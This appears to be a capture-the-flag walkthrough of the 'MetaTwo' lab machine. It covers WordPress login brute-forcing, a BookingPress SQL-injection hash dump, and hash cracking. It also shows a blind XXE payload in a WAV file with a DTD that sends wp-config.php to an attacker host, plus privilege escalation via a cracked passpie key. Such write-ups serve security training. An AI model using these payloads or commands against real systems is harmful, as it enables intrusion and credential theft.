# MetaTwo  


## Nmap  

All ports.  

```
21/tcp open  ftp?    syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0
```  

## HTTP 80  

Username bruteforcing, finding 'admin' and 'manager'.  

```
hydra -L /usr/share/commix/src/txt/usernames.txt -p "password" metapress.htb http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fmetapress.htb%2Fwp-admin%2F&testcookie=1:Unknown username. Check again or try your email address."
```


Password brute forcing.  

```
ffuf -u http://metapress.htb/wp-login.php -w /usr/share/SecLists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt -X POST -H "Cookie: PHPSESSID=8g1l8hvk4u30j9ikbb0oa3512n; wordpress_test_cookie=WP%20Cookie%20check" -H "Content-Type: application/x-www-form-urlencoded" -d "log=manager&pwd=FUZZ&wp-submit=Log+In&redirect_to=http%3A%2F%2Fmetapress.htb%2Fwp-admin%2F&testcookie=1" -fw 364
```

### Users  

Found the 'admin' and 'manager' passwords with a booking press CVE-2022-0739 plugin sql injection vuln.  

```
{
  "admin": {
    "email": "admin@metapress.htb",
    "password": "$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV."
  },
  "manager": {
    "email": "manager@metapress.htb",
    "password": "$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70"
  }
}
```  

### Password Cracking  

Cracking manager password with HashCat, hash format is phpass.  

`hashcat -m 400 -a 0 -o cracked.txt target_hashes.txt /usr/share/wordlists/rockyou.txt`  

Password.  

`$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:partylikearockstar`

Rough notes, need to be properly typed when I have more time.  

## Wordpress exploit XXE  

The following blog has a great write up of this vuln.  

`https://www.sonarsource.com/blog/wordpress-xxe-security-vulnerability/`  

This is an authenticated blind XXE vuln which we would see in our attacking web logs url. This is the wave file.  

`payload.wav`

```
RIFFXXXXWAVEBBBBiXML<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://attacker-url.domain/xxe.dtd">
%sp;
%param1;
]>
<r>&exfil;</r>>
```  

This file will be retrieved from ourselves, then the file contents will be attempted to be retrieved from my machine,which can be seen in my access logs.  

`xxe.dtd`  

```
<!ENTITY % data SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=../wp-config.php">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker-url.domain/?%data;'>">
```  

This can be used to read wp-config.php or the ftp server config file and ssh keys which are running on the system.  

An exploit script can be found.  

`https://www.exploit-db.com/exploits/50304`  

The following command retrieves the /etc/passwd file.  

`./exploit.sh metapress.htb manager partylikearockstar /etc/passwd 10.10.14.140`  

This finds user.  

`jnelson`  

Using this command to find app webroot nginx.  

`./exploit.sh metapress.htb manager partylikearockstar /etc/nginx/sites-enabled/default 10.10.14.140`  

`/var/www/metapress.htb/blog`  

Find the following information with wp-config.php file.  

`./exploit.sh metapress.htb manager partylikearockstar /var/www/metapress.htb/blog/wp-config.php 10.10.14.140`  


```
/** The name of the database for WordPress */
define( 'DB_NAME', 'blog' );

/** MySQL database username */
define( 'DB_USER', 'blog' );

/** MySQL database password */
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```  

```
define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );
```

## User credentials  

The following was found when enumerating ftp. The file 'send_email.php' contained.  

```
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys"; 
```  

## Priv Esc  

Finding the following in /home/jnelson/.passpie/ssh/root.pass  

```
comment: ''
fullname: root@ssh
login: root
modified: 2022-06-26 08:58:15.621572
name: ssh
password: '-----BEGIN PGP MESSAGE-----


  hQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2

  nAfK00HJ/hMzSrm4hDd8JyoLZsEGYphvuKBfLUFSxFY2rjW0R3ggZoaI1lwiy/Km

  yG2DF3W+jy8qdzqhIK/15zX5RUOA5MGmRjuxdco/0xWvmfzwRq9HgDxOJ7q1J2ED

  /2GI+i+Gl+Hp4LKHLv5mMmH5TZyKbgbOL6TtKfwyxRcZk8K2xl96c3ZGknZ4a0Gf

  iMuXooTuFeyHd9aRnNHRV9AQB2Vlg8agp3tbUV+8y7szGHkEqFghOU18TeEDfdRg

  krndoGVhaMNm1OFek5i1bSsET/L4p4yqIwNODldTh7iB0ksB/8PHPURMNuGqmeKw

  mboS7xLImNIVyRLwV80T0HQ+LegRXn1jNnx6XIjOZRo08kiqzV2NaGGlpOlNr3Sr

  lpF0RatbxQGWBks5F3o=

  =uh1B

  -----END PGP MESSAGE-----

  '
```  

Find the passphrase.  

`gpg2john key > key.john`  

`john -w=/usr/share/wordlists/rockyou.txt key.john`  

Using phrase to get passpie file.  

```
touch pass
passpie export pass
cat pass
```  

To get root password.
